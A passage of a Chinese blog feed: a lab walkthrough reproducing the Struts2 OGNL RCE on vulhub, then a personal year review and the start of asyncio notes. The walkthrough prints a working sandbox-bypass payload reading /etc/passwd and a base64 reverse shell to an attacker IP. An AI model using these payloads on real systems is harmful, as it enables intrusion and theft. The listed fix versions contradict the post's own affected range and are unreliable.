      "description": "<h2>\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/hzhsec/p/19492577\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 16:02\">\n    <span>Apache Struts2 OGNL RCE注入</span>\n    \n\n</a>\n\n\t\t</h2>\n\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        Apache Struts2 OGNL RCE漏洞是一种严重的远程代码执行漏洞，攻击者通过构造恶意的OGNL表达式注入到HTTP请求参数中，利用Struts2框架对OGNL表达式处理不当的缺陷，绕过安全沙箱限制，最终实现在目标服务器上执行任意系统命令，从而获取服务器控制权。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1什么是apache-struts2\">1.什么是Apache Struts2?</h2>\n<p>Apache Struts2（也称为 Struts2）是一个开源的 Java Web 应用框架。<br />\n它主要用于构建企业级 <code>Java EE Web</code> 应用程序，提供 <code>MVC</code>（<code>Model-View-Controller</code>）架构支持，帮助开发者快速开发可维护的 Web 应用。</p>\n<p>Struts2 基于 <code>OGNL</code>（<code>Object-Graph Navigation Language</code>）表达式语言来处理数据绑定、表单验证和动态内容渲染等功能。它是 <code>Struts1</code> 的后继版本，从 2006 年左右开始流行，但由于历史漏洞较多，现在许多项目已转向更现代的框架如 Spring MVC。</p>\n<h2 id=\"2原理\">2.原理</h2>\n<p>(1) <strong>OGNL</strong></p>\n<p><strong>OGNL三要素</strong></p>\n<ol>\n<li>\n<p><strong>Expression（表达式）</strong> 字符串形式的指令，告诉 OGNL “你要做什么”。 例子：<code>user.name</code>、<code>@java.lang.Runtime@getRuntime().exec('calc')</code>、<code>#session.get('user')</code> 等</p>\n</li>\n<li>\n<p><strong>Root（根对象）</strong> 操作的“主体对象”，也就是你主要想访问/修改的对象。 在 Struts2 中，<strong>Root 默认就是 ValueStack（值栈）</strong>，值栈最顶层通常是当前的 Action 实例。 → 访问 Root 对象的属性时，<strong>不需要加任何前缀</strong>，直接写属性名即可。</p>\n</li>\n<li>\n<p><strong>Context（上下文）</strong> 一个 Map 结构（OgnlContext），相当于“运行环境”。 里面存放了各种辅助对象、临时变量、环境信息等。 在 Struts2 中，<strong>Context 就是 ActionContext</strong>，包含了：</p>\n<ul>\n<li><code>#parameters</code>（请求参数）</li>\n<li><code>#request</code></li>\n<li><code>#session</code></li>\n<li><code>#application</code></li>\n<li><code>#attr</code>（依次查找 page→request→session→application）</li>\n<li>值栈本身（作为 Root）<br />\n→ 访问 Context 里的对象，必须加 <strong>#</strong> 前缀，例如 <code>#session.user</code>、<code>#parameters.name</code></li>\n</ul>\n</li>\n</ol>\n<p><strong>OGNL中的重要符号</strong></p>\n<p>有三个<code>#%$</code><br />\n<code>%</code></p>\n<pre><code>%: 其用途是在标志属性为字符串类型时，计算OGNL表达式的值，类似JS中的函数eval()。 \n例如:&lt;s:url value =“%{items.{title}[0]}”/&gt;。获取items对象中title属性，title为数组，取数组索引为0位置的值\n</code></pre>\n<p><code>#</code></p>\n<pre><code>访问 Context（非根对象）里的数据,取 session、request、parameters、application 等时使用\n例如:#session.user #parameters.username #request.get('key')\n</code></pre>\n<p><code>$</code></p>\n<pre><code>1. 在 struts.xml 配置文件里引用 OGNL\n2. 在国际化资源文件（.properties）里引用 OGNL\n例如:struts.xml 里： 资源文件：welcome=${user.name}\n</code></pre>\n<p>(2) <strong>OGNL RCE漏洞原理</strong></p>\n<p>OGNL RCE漏洞是 <code>Struts2</code> 中一类常见的严重安全问题，主要源于框架对 <code>OGNL</code> 表达式的处理不当。</p>\n<p><code>OGNL</code> 是一种强大的表达式语言，用于访问 Java 对象的属性和方法.但在 <code>Struts2</code> 中，如果用户输入（如 <code>HTTP</code> 请求头、参数或标签属性）被直接用于 <code>OGNL</code> 求值，而没有充分验证或转义，就会导致注入攻击。</p>\n<p><strong>漏洞影响范围</strong></p>\n<p>OGNL RCE 漏洞影响了 <code>Struts2</code> 的多个历史版本：</p>\n<ul>\n<li>常见受影响版本：从 <code>Struts 2.0.0</code> 到 <code>2.5.x </code>系列（如 <code>2.5.25</code> 之前），部分 6.x 早期版本有类似问题。但许多旧版本（如 2.3.x）已停止支持（EOL）。<br />\n不是所有 <code>Struts2</code> 应用都易受攻击，取决于配置（如是否使用强制 <code>OGNL</code> 求值或暴露了特定插件）。但遗留系统特别危险。</li>\n</ul>\n<h2 id=\"3漏洞复现\">3.漏洞复现</h2>\n<p>漏洞复现环境<br />\n准备好<code>docker</code></p>\n<ol>\n<li><strong>靶机环境</strong>（使用 vulhub靶场）：</li>\n</ol>\n<pre><code class=\"language-bash\">克隆vulhub仓库\ngit clone --depth 1 https://github.com/vulhub/vulhub.git\n到漏洞地址\ncd vulhub/struts2/s2-061\n</code></pre>\n<p>拉取镜像</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>拉取失败的可以使用这个仓库的镜像源配置工具:</p>\n<pre><code class=\"language-sh\">git clone https://github.com/hzhsec/docker_proxy.git\nchmod +x *.sh\n./docker-proxy.sh\n</code></pre>\n<p>再拉取</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>使用docker ps查看镜像是否运行</p>\n<p>访问：<a href=\"http://xn--IP-eo8d177o:8080\" rel=\"noopener nofollow\" target=\"_blank\">http://靶机IP:8080</a><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<ul>\n<li>尝试id注入代码</li>\n</ul>\n<pre><code>http://192.168.41.128:8080/.action?id=%{'hzhsec'+(1+2).toString()}\nurl编码\nhttp://192.168.41.128:8080/.action?id=%25%7B'hzhsec'%2B(1%2B2).toString()%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功将id的值更换执行</p>\n<p>尝试poc</p>\n<pre><code>%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]). (#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]). (#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)). (#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")). (#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)). (#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"cat /etc/passwd\")). (#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n\n编码:\n%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22cat%20%2Fetc%2Fpasswd%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功读取<code>/etc/passwd</code><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<p>尝试修改命令反弹shell</p>\n<pre><code>shell命令\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\n替换上面的cat命令\n</code></pre>\n<p>攻击机:</p>\n<pre><code>nc -lvvp 4444 启动监听\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n发送payload</p>\n<pre><code>http://192.168.41.128:8080/.action?id=%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4yMTAuNjYuMTA4LzQ0NDQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p>成功上线:<br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<h3 id=\"poc原理\">poc原理</h3>\n<ol>\n<li>\n<p><strong>获取 Tomcat 的 InstanceManager</strong> <code>#instancemanager</code> = <code>#application[\"org.apache.tomcat.InstanceManager\"]</code> → 从 <code>ServletContext</code>（application）里拿到<code> Tomcat</code> 的实例管理器，它能“暴力”new 出任何类的实例（即使 OGNL 沙箱不允许）。</p>\n</li>\n<li>\n<p><strong>拿到当前的 ValueStack（值栈）</strong> <code>#stack</code> = <code>#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]</code> → 值栈是 <code>Struts2</code> 的核心，里面存着 <code>Action</code>、<code>request</code>、<code>session</code> 等所有上下文信息。</p>\n</li>\n<li>\n<p><strong>用 <code>BeanMap</code> 魔法绕过访问限制</strong>（最核心的沙箱绕过技巧） <code>#bean</code> = <code>#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")</code> <code>#bean.setBean(#stack)</code> → 创建一个 <code>BeanMap</code>（一种能把任意对象当 Map 用的黑科技类），然后把值栈塞进去。 之后就能通过 <code>.get(\"context\")</code>、 <code>.get(\"memberAccess\")</code> 这种方式，访问原本不允许直接访问的私有字段。</p>\n</li>\n</ol>\n<p>继续链式操作： → 先拿到 <code>context</code> → 再拿到 <code>_memberAccess</code>（OGNL 的安全管理器对象，控制什么能执行、什么类被禁止）</p>\n<ol start=\"4\">\n<li>\n<p><strong>清空沙箱黑名单</strong>（真正解除限制） <code>#emptyset = #instancemanager.newInstance(\"java.util.HashSet\") </code> <code>#bean.put(\"excludedClasses\", #emptyset)</code> <code>#bean.put(\"excludedPackageNames\", #emptyset)</code> → 把 OGNL 的两个黑名单（禁止的类 + 禁止的包）全部清空成空集合。 → 从此 OGNL 什么类都能用了，什么包都能访问了（沙箱彻底失效）。</p>\n</li>\n<li>\n<p><strong>准备命令并执行</strong> <code>#arglist</code> = <code>#instancemanager.newInstance(\"java.util.ArrayList\")</code> <code>#arglist.add(\"cat /etc/passwd\")</code> → 创建一个参数列表，里面放要执行的命令。</p>\n</li>\n</ol>\n<p><code>#execute</code> = <code>#instancemanager.newInstance(\"freemarker.template.utility.Execute\") #execute.exec(#arglist)</code> → 用 Freemarker 自带的 Execute 工具类来执行系统命令（这个类本来不允许被 OGNL 调用，但现在沙箱没了，就能用了）。</p>\n<p>**总结： 这个payload 先用 Tomcat InstanceManager + BeanMap 魔法链 → 找到并修改 OGNL 的安全管理器 → 清空所有黑名单 → 最后用 Freemarker 的 Execute 类执行 cat /etc/passwd。</p>\n<h2 id=\"4漏洞防御\">4.<strong>漏洞防御</strong></h2>\n<p>1、升级到Struts 2的安全版本，比如<code>2.3.32</code>或<code>2.5.16</code>，这些版本包含了对应的安全修复<br />\n2、禁用OGNL表达式的执行，或者使用Struts 2的安全<code>mechansim</code>。</p>\n<p><strong>免责声明</strong><br />\n本文档所包含的漏洞复现方法、技术细节及利用代码，<strong>仅限用于授权的安全测试、教育学习与研究目的</strong>。<br />\n<strong>严禁</strong>在未获得明确授权的情况下，对任何系统进行测试或攻击。任何不当使用所导致的法律责任及后果，均由使用者自行承担。<br />\n作者与文档提供者不承担任何因滥用本文档信息而产生的直接或间接责任。请遵守您所在地的法律法规，并始终践行负责任的网络安全实践。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n\t\t<p class=\"postfoot\">\n\t\t\tposted on \n<span id=\"post-date\">2026-01-16 16:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/hzhsec\">hzhsec</a>&nbsp;\n阅读(<span id=\"post_view_count\">13</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n\t\t</p>"
    },
    {
      "title": "我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海",
      "link": "https://www.cnblogs.com/HaiJun-Aion/p/19492492",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/HaiJun-Aion/p/19492492\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 15:50\">\n    <span>我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>2025 年，如果让我用一句话定性，我会说：<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>这一年我做了很多事，多到我一度不敢回头看。表面上看，我一直在“往前”：写内容、做项目、跑副业、见人、奔波、搬家、维权、再回上海。可只有我自己知道，真正折磨人的不是忙，是那种反复出现的瞬间——我突然意识到：我不是在冲，我是在<strong>被生活推着跑</strong>。</p>\n<p>我确实拿到了一些结果。内容有过爆的时刻，小红书涨了粉，视频剪辑从手忙脚乱到慢慢顺手，有人开始来问我、信我、甚至愿意付费。那段时间我有一种很罕见的笃定：只要我肯学、肯磨，很多事我都能做成。那种“我好像什么都能做”的自信，在这一年里反复把我从低谷里托起来。</p>\n<p>但同样是这一年，我也交了一笔不轻的学费。不是钱那么简单，更是对人、对机会、对“看起来很美”的承诺的那种天真。我曾因为信任做了一个很重的决定；也曾在北京的夜里把事情一条条摊开算清楚，最后发现不是值不值的问题，而是我再拖下去，就会把自己耗到没样子。</p>\n<p>我不想把这篇复盘写成流水账，也不想写成鸡汤。我只想把这一年最真实的部分摆出来：我怎么一点点变强，怎么被现实教育，怎么止损、怎么维权、怎么把自己从废墟里捡回来。</p>\n<hr />\n<h2 id=\"1-我开始把表达当成一件正事\">1. 我开始把表达当成一件正事</h2>\n<p>三月开始，我把很多注意力放在“说清楚”这件事上。</p>\n<p>以前我也输出，但更多像随手记录。2025 年不一样，我开始认真经营表达：每天钻研、每天尝试、每天复盘。公众号有了更明确的正反馈，有几篇文章突然被推起来，评论区开始出现陌生人的共鸣，后台也开始有人来问我问题。那种感觉很奇妙——我写的东西不再只属于我自己，它开始进入别人的生活。</p>\n<p><strong>今年使用最多的AI IDE 就是Trae，也参加了第一期的Trae 征文活动，获得了第二名，Trae给我来了很多成长。</strong></p>\n<h3 id=\"今年在trae-方面的实践\">今年在Trae 方面的实践：</h3>\n<ol>\n<li><a href=\"https://juejin.cn/post/7462542925915848744\" rel=\"noopener nofollow\" target=\"_blank\">字节跳动推出AI编程神器Trae，基于Trae 从 0 开发一个Google 插件！</a><br />\n<img alt=\"image\" class=\"lazyload\" /></li>\n</ol>\n <hr /> \n<hr /> \n<p>2.<a href=\"https://github.com/TickHaiJun/Dompet-App-React-Native\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 开发的第一个APP</a></p>\n<p>Trae 刚出来Claude模型时，连夜测评它的能力，当时花了5个小时搞出一个App，项目并且还开源了<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<ol start=\"3\">\n<li><a href=\"https://github.com/TickHaiJun/Podcast\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 设计的原型稿</a></li>\n</ol>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我也开始碰视频。说实话，一开始很狼狈：剪一个一分钟的视频，要花我两三个小时。卡点、配乐、字幕、节奏，哪一样都不像看起来那么简单。我一度怀疑是不是我不适合，但又不甘心。我知道这是一块我之前没尝试过的能力，一旦练出来，就是新的路。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1VHQLYvE6C/?vd_source=824b78ff76f90d1fc4e5e732bb09b3c1\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae还做了原型还原设计稿，没想到视频火了</a><br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这一段给我的礼物，是一种更稳定的自信：很多事看起来复杂，只要拆开、一步步做，就会变得可控。</p>\n<hr />\n<h2 id=\"2-我把想法做成了作品通过vibe-coding\">2. 我把想法做成了作品通过Vibe Coding</h2>\n<p>五月到八月，我进入了一种“手里有活”的状态。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg2ODI4OTMwMw==&amp;mid=2247492557&amp;idx=1&amp;sn=8949270a3c3bf6f409d6e6046cb8411a&amp;scene=21#wechat_redirect\" rel=\"noopener nofollow\" target=\"_blank\">从懵懂到落地：记录我们第一次成功将大模型“塞”进业务的曲折历程</a></p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>年初做了自己第一款AI应用</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那段时间我做了很多作品，也开源了不少东西。说白了，就是把想法从脑子里拎出来，做成一个能跑、能看、能用、能被别人理解的东西。</p>\n<p>与此同时，我也给团队做了多次分享，讲我最近在做什么、怎么做、踩了什么坑、怎么绕开。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>中间有两次机会我印象很深：一次是来自一家很大的咨询公司，一次是出海方向的远程邀请。它们都挺诱人，但我当时都拒绝了。原因很简单：我知道我还没准备好。能力没到那个厚度、心态没到那个稳定度，我不想靠运气上去，然后靠硬扛撑住。</p>\n<p>也有一些小小的惊喜：有人买了我做的东西，虽然数量不算多，但足够让我确认——我做的东西不是自嗨，是真的有人需要。更重要的是，越来越多的网友通过我的内容认识我，联系我，问我问题。</p>\n<p>那几个月我最大的收获不是“做了多少”，而是一个更朴素的结论：<strong>想法不值钱，做出来才值钱。</strong></p>\n<hr />\n<h2 id=\"3-有人愿意为我的能力买单\">3. 有人愿意为我的能力买单</h2>\n<p>九月到十一月，我的副业开始像一门“正经事”。</p>\n<p>咨询变多了。有的是临时问答，有的是更系统的陪跑。我接了三份陪跑，也因此认识了几位很投缘的朋友，都是山西的。我们聊项目、聊选择、聊怎么把事情做成，也聊怎么在现实里不把自己弄丢。</p>\n<p>这份关系很珍贵。它不是那种互相吹捧的热闹，而是我能明显感到：对方因为我的建议少走了弯路，事情推进得更顺，而我也因为对方的反馈变得更坚定。那种“我真的帮到了人”的成就感，比数字更实在。</p>\n<p>我也在这一段第一次更清晰地看到我的位置：我不是只能埋头做项目的人，我还可以把经验讲清楚，把复杂拆简单，把别人卡住的点指出来。这是一种能力，也是一种责任感。</p>\n<p>这一段让我相信：靠自己攒出来的口碑，慢，但稳。</p>\n<hr />\n<h2 id=\"4-我重新确认了钱该花在哪\">4. 我重新确认了“钱该花在哪”</h2>\n<p>国庆我和家人自驾出去玩了一趟。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>风很大，天很高，羊肉很香。我们在草原上待了一天，我给父母安排了越野卡丁车，让他们在草地上跑一圈；我和姐姐骑了马，笑得像回到小时候。那几天我很放松，甚至有点恍惚——原来我努力这么久，最想换来的并不是某个头衔，而是这种“我能让他们开心”的底气。</p>\n<p>我以前对花钱很谨慎，总觉得要攒着、要算计回报。可当我把钱花在家人身上，那种舒坦很直接：不需要证明，不需要解释，花出去就是一种“我扛得住了”的确认。</p>\n<hr />\n<h2 id=\"5-去北京一趟我把胆子捡了回来\">5. 去北京一趟，我把胆子捡了回来</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十月我去北京参加了一个活动，也算第一次为了这类事出远门。2026年，多输出AI，多参加活动。</p>\n<p>现场人很多，节奏很快，信息密得让人喘不过气。那天我最大的感受，不是见了什么产品，而是突然明白：机会真的会从我身边走过去，走过去就没了。很多时候不是我不够好，是我不敢站出来，或者我下意识觉得“我还不够格”。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>去天津路上，熟悉的感觉</p>\n<p>我也去了天津，见了老朋友老李。我们聊了一整天，我帮他搬运整理食品，他带我吃了天津菜，甚至让我体验了一把保时捷 911。最后他把我送到机场。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一天让我很感慨：这个世界其实很大，也很活，我不能总把自己困在“怕麻烦、怕尴尬、怕出丑”的情绪里。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>今年我也买了不少书，也读了不少书。《亲密关系》《认知驱动》《纳瓦尔宝典》……它们没有给我标准答案，但给了我更清醒的视角：我要对自己的情绪负责，对自己的选择负责，对自己的长期负责。</p>\n<hr />\n<h2 id=\"6-我相信过他也因此完成了一次祛魅\">6. 我相信过他，也因此完成了一次祛魅</h2>\n<p>十一月底，我做了一个很重的决定：离职，去北京试一次。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这件事我并不是冲动。相反，我想了将近一个月。朋友“他”邀请过我三次，前两次我都拒绝了。第三次创始人亲自找我，话说得很漂亮，未来画得很大，而我也确实在那个阶段渴望一次更大的空间。再加上对“他”的信任，我最终点了头。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>离开前，我做了一件我很想做的事：把爸爸接到上海。那是他第一次来上海，也是他第一次坐飞机。我去接他的时候，他脸上的喜悦藏不住。我带他逛了很多地方，拍了很多照片。送他去机场那天，我心里很踏实——那种成就感，不来自任何评价，只来自“我能带他看世界”的瞬间。</p>\n<p>今年我也给妈妈买了新手机，她之前那部太卡了。再小的事情，落在父母身上都是实在的改变。</p>\n<p>然后我去了北京。</p>\n<p>现实很快给了我一记闷棍。之前说的和实际差太多太多。我会在很短时间内发现：有些话只是话，有些承诺只是情绪，有些“格局”只是包装。我不想在这里写具体细节，但我可以写结论——这次经历让我完成了一次祛魅：对人、对所谓“机会”、对“看起来很美”的未来。</p>\n<p>我也更清楚了一件事：我并不是不能吃苦，我是不愿意把我的尊严和时间押在不靠谱的人和不靠谱的事上。</p>\n<hr />\n<h2 id=\"7-我救了三只狗也被这座城市的善意接住\">7. 我救了三只狗，也被这座城市的善意接住</h2>\n<p>这一年我救了三只狗。<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>第一只是中华田园犬，在公园遇到的。它很瘦，眼神怯，但又不躲人。</p>\n<p>第二只是边牧，在公司附近，它更像是走丢的孩子，聪明又无助。<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>第三只是阿拉斯加，在豫园附近，体型很大，却一点安全感都没有。</p>\n<p>我喜欢狗。遇见它们的时候，我很难装作没看见。我做的事其实也不复杂：拍照、发帖、联系、筛选领养人、把信息对齐清楚，然后送它们去新家。</p>\n<p>这件事最打动我的，不是我多善良，而是我发现：大城市真的有很多愿意伸手的人。我发出求助，真的会有人回应。我以为我在救它们，其实在某些时刻，是这些善意在把我从疲惫里接住。</p>\n<hr />\n<h2 id=\"8-一笔沉没成本止损维权和不再委屈自己\">8. 一笔沉没成本：止损、维权、和不再委屈自己</h2>\n<p>十二月初，北京给了我最硬的一课。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我在北京待了十来天，一直住酒店。对方之前说会报销，但后来什么都没有。入职前一天我找了房子，租房费用、中介费用、再加上各种奔波成本，堆起来是一笔不小的支出。更糟的是：入职第一天我就通过另一位同样处境的人了解到了真实情况；再加上“他”下班后说的一些话，我很快确定——这里不是我该待的地方。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一刻最难的其实不是离开，而是面对沉没成本。我已经付出那么多，我会本能地想“再忍忍，再等等”。但我很庆幸，那天我没骗自己。我选择止损。</p>\n<p>随之而来的就是维权。房子我没入住，合同日期也没开始，但管家很无赖，甚至带着恐吓。那种“我讲理他就耍赖”的感觉很恶心。我一开始也很烦，后来干脆不和她废话，直接走流程，通过 12315 协调，拿回了一部分。理论上可以拿回更多，但要继续耗时间精力，我当时选择到此为止。</p>\n<p>这一段时间，让家里也没少操心，哎....</p>\n<p>我最想写给自己的不是“钱亏了”，而是一个更重要的结论：<strong>以后遇到不公，我不再用委屈换和平。该维权就维权，该翻脸就翻脸。</strong></p>\n<hr />\n<h2 id=\"9-回到上海我把自己一点点拉回正轨\">9. 回到上海：我把自己一点点拉回正轨</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十二月中旬我回到了上海。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>收拾好家里的工位</p>\n<p>那段时间我能量很低。不是累，是一种被现实撞过之后的钝。我会怀疑自己、怀疑判断、怀疑信任，甚至怀疑“是不是我太敏感了”。但生活不会等我缓过来，它只会继续往前。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我做的第一件事是把我自己拉回正常：吃饭、睡觉、见朋友。后来我和老耿去了杭州散心。城市很安静，走在路上我突然发现：风还是一样吹，灯还是一样亮，我不会因为受挫就失去明天。</p>\n<p>我慢慢控住场了。把生活拉回正轨了。也把那句最重要的话重新捡回来——<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<hr />\n<h2 id=\"最后\">最后</h2>\n<p>回头看 2025 年，我最大的变化不是“我做了多少”，而是<strong>我对人生结构的要求变高了</strong>。</p>\n<p>以前我会把努力当成答案。现在我更在意：这份努力能不能沉淀，能不能让我拥有更多选择权。以前我遇到烂事会先忍，想着“算了”。但北京那一段之后我更确定：委屈不会换来尊重，只会换来下一次更大的代价。该止损就止损，该维权就维权——哪怕沉没成本已经砸下去，我也要把自己从泥里拎出来。</p>\n<p>这一年我也完成了一次祛魅：<br />\n对“机会”的祛魅，对“关系”的祛魅，对“画出来的未来”的祛魅。<br />\n我开始相信一句话：<strong>真正值得的机会，不会只靠嘴说；真正可靠的人，也不会只靠情绪绑架。</strong></p>\n<p>如果说 2025 年教会了我什么，我觉得是三件事：</p>\n<p>第一，能力不是拿来逞强的，是拿来兜底的。<br />\n我在最狼狈的时候，靠自己把局面稳住了。那种“我能扛住”的底气，是真的。</p>\n<p>第二，钱花在家人身上，会变成一种很踏实的成就感。<br />\n我以前以为成就感来自外界认可，今年我更确定：来自父母的笑、来自家人的安心、来自“我可以照顾他们”。</p>\n<p>第三，善意是会流动的。<br />\n我帮过人，也被人帮过；我救过狗，也被陌生人的热心治愈过。世界不全是烂人，但我得学会识别，学会筛选，学会保护自己。</p>\n<p>2026 年我不想再喊口号了。我只想做三件更具体的事：</p>\n<ul>\n<li><strong>把一条能长期跑的主线做出来</strong>：让输出、作品和服务真正形成稳定的节奏，而不是靠运气起伏。</li>\n<li><strong>给信任立规矩</strong>：合作要有边界，承诺要能落地，任何决定都要留后手。</li>\n<li><strong>把家放进计划里</strong>：不是“有空再说”，而是本来就该排在前面。</li>\n</ul>\n<p>2025 年没有把我推到高处，但它把我从幻觉里拽出来了。<br />\n我依然会往前走，只是以后我更在乎的不是速度，而是方向；不是热闹，而是结构。</p>\n<p><strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>希望2026年一切顺利!</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 15:50</span>&nbsp;\n<a href=\"https://www.cnblogs.com/HaiJun-Aion\">程序员海军</a>&nbsp;\n阅读(<span id=\"post_view_count\">73</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【笔记】A Conceptual Overview of asyncio",
      "link": "https://www.cnblogs.com/wngtk/p/19491520",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/wngtk/p/19491520\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 14:07\">\n    <span>【笔记】A Conceptual Overview of asyncio</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>读了这两篇（也可以说是一篇），我才正确认识了 Python 的协程。不能直接把 Python async/await 当作 JavaScript async/await一样的东西。</p>\n<ul>\n<li><a href=\"https://docs.python.org/3/howto/a-conceptual-overview-of-asyncio.html\" rel=\"noopener nofollow\" target=\"_blank\">https://docs.python.org/3/howto/a-conceptual-overview-of-asyncio.html</a></li>\n<li><a href=\"https://github.com/anordin95/a-conceptual-overview-of-asyncio/tree/main\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/anordin95/a-conceptual-overview-of-asyncio/tree/main</a></li>\n</ul>\n<p>在学习 Python 协程之前，我对 JavaScript 协程已经略有了解，在 JavaScript async/await 